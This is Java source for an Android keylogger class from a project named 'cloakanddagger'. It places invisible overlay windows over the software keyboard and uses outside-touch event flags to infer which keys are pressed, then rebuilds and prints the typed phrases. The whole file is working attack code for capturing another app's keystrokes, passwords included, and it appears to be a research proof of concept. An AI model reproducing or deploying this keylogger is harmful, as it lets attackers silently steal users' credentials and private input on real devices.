package com.konradkevin.cloakanddagger;

import android.content.Context;
import android.graphics.PixelFormat;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;

class KeyloggerManager {
    private int MAX_INDEX = 65;
    private int width;
    private boolean shifted = false;
    private boolean alt = false;
    private String phrase = "";
    private WindowManager manager;
    private volatile Context parent;
    private volatile View[] row_1 = new View[10];
    private volatile View[] row_2 = new View[9];
    private volatile View[] row_3 = new View[9];
    private volatile View[] row_4 = new View[5];
    private volatile int total = 0;
    private String[] qwerty_alpha = {
            "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
            "a", "s", "d", "f", "g", "h", "j", "k", "l",
            "shift", "z", "x", "c", "v", "b", "n", "m", "back",
            "alt", "misc", " ", ".", "enter"};
    private String[] alt_alpha = {
            "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
            "@", "#", "$", "%", "&", "-", "+", "(", ")",
            "symbols", "*", "\"", "\'", ":", ";", "!", "?", "back",
            "alt", ",", " ", ".", "enter"};

    KeyloggerManager(Context cxt, WindowManager manager, int width) {
        parent = cxt;
        this.manager = manager;
        this.width = width;
        makeOverlay();
    }

    private void makeOverlay() {
        int i;
        int flags = 0;
        int type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
        manager = (WindowManager) parent.getSystemService(Context.WINDOW_SERVICE);
        View touch_view = View.inflate(parent, R.layout.touch_view, null);
        WindowManager.LayoutParams layoutParams_touch = new WindowManager.LayoutParams(0, 0, WindowManager.LayoutParams.TYPE_TOAST, flags | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL, PixelFormat.TRANSLUCENT);
        touch_view.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                if (event.getAction() == MotionEvent.ACTION_OUTSIDE) {
                    try {
                        Thread.sleep(10);
                    } catch (Exception e) {
                        System.err.println("Sleep error: " + e);
                        return false;
                    }

                    if (MAX_INDEX-total >= 0) {
                        String key = qwerty_alpha[total];

                        if (alt) {
                            key = alt_alpha[total];
                            phrase += key;
                            System.out.println("Total: " + total + " Input: " + key);

                            if (shifted) {
                                shifted = false;
                            }

                            if (key.equals(" ") || key.equals("alt")) {
                                alt = !alt;
                            }
                        } else if (shifted) {
                            phrase += key.toUpperCase();
                            System.out.println("Total: " + total + " Input: " + key.toUpperCase());
                            shifted = !shifted;
                        } else if (key.equals("alt")) {
                            alt = !alt;
                        } else if (key.equals("shift")) {
                            shifted = !shifted;
                        } else {
                            System.out.println("Total: " + total + " Input: " + key);

                            if(!key.equals("outside") && !key.equals("symbols") && !key.equals("alt") && !key.equals("misc") && !key.equals("shift") && !key.equals("back") && !key.equals("enter")) {
                                phrase += key;
                            }

                            if (key.equals("enter")) {
                                System.out.println("Phrase: " + phrase);
                                phrase = "";
                            }
                        }
                    }

                    total = 0;
                    return true;
                }

                return false;
            }
        });
        layoutParams_touch.gravity = Gravity.TOP | Gravity.END;
        manager.addView(touch_view, layoutParams_touch);

        for (i=0; i<row_1.length; i++) {
            row_1[i] = View.inflate(parent, R.layout.key_overlay, null);
            WindowManager.LayoutParams layoutParams_keys = new WindowManager.LayoutParams(width/10, 175, type, flags | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH, PixelFormat.TRANSLUCENT);
            row_1[i].setOnTouchListener(new View.OnTouchListener() {
                @Override
                public boolean onTouch(View v, MotionEvent event) {
                    v.performClick();

                    if(event.getAction() == MotionEvent.ACTION_OUTSIDE) {
                        total += event.getFlags();

                    }

                    return false;
                }
            });

            layoutParams_keys.gravity = Gravity.BOTTOM | Gravity.START;
            layoutParams_keys.x = (width/10)*i;
            layoutParams_keys.y = 525;

            manager.addView(row_1[i], layoutParams_keys);
        }
        for (i=0; i<row_2.length; i++) {
            row_2[i] = View.inflate(parent, R.layout.key_overlay, null);
            WindowManager.LayoutParams layoutParams_keys = new WindowManager.LayoutParams(width/9, 175, type, flags | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH, PixelFormat.TRANSLUCENT);
            row_2[i].setOnTouchListener(new View.OnTouchListener() {
                @Override
                public boolean onTouch(View v, MotionEvent event) {
                    v.performClick();

                    if (event.getAction() == MotionEvent.ACTION_OUTSIDE) {
                        total += event.getFlags();
                    }
                    return false;
                }
            });

            layoutParams_keys.gravity = Gravity.BOTTOM | Gravity.START;
            layoutParams_keys.x = (width/9)*i;
            layoutParams_keys.y = 350;
            manager.addView(row_2[i], layoutParams_keys);
        }
        for (i=0; i<row_3.length; i++) {
            row_3[i] = View.inflate(parent, R.layout.key_overlay, null);
            WindowManager.LayoutParams layoutParams_keys = new WindowManager.LayoutParams(width/9, 175, type, flags | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH, PixelFormat.TRANSLUCENT);
            row_3[i].setOnTouchListener(new View.OnTouchListener() {
                @Override
                public boolean onTouch(View v, MotionEvent event) {
                    v.performClick();

                    if (event.getAction() == MotionEvent.ACTION_OUTSIDE) {
                        total += event.getFlags();
                    }
                    return false;
                }
            });

            layoutParams_keys.gravity = Gravity.BOTTOM | Gravity.START;
            layoutParams_keys.x = (width/9)*i;
            layoutParams_keys.y = 175;
            manager.addView(row_3[i], layoutParams_keys);
        }

        for (i=0; i<row_4.length; i++) {
            row_4[i] = View.inflate(parent, R.layout.key_overlay, null);
            int test = (i == 2) ? ((width/9)*5) : (width/9);
            WindowManager.LayoutParams layoutParams_keys = new WindowManager.LayoutParams(test, 175, type, flags | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH, PixelFormat.TRANSLUCENT);
            row_4[i].setOnTouchListener(new View.OnTouchListener() {
                @Override
                public boolean onTouch(View v, MotionEvent event) {
                    v.performClick();

                    if (event.getAction() == MotionEvent.ACTION_OUTSIDE) {
                        total += event.getFlags();
                    }
                    return false;
                }
            });

            layoutParams_keys.gravity = Gravity.BOTTOM | Gravity.START;
            layoutParams_keys.x = (i > 2) ? (width/9) * (i+4) : (width/9)*i;
            layoutParams_keys.y = 0;
            manager.addView(row_4[i], layoutParams_keys);
        }
    }
}
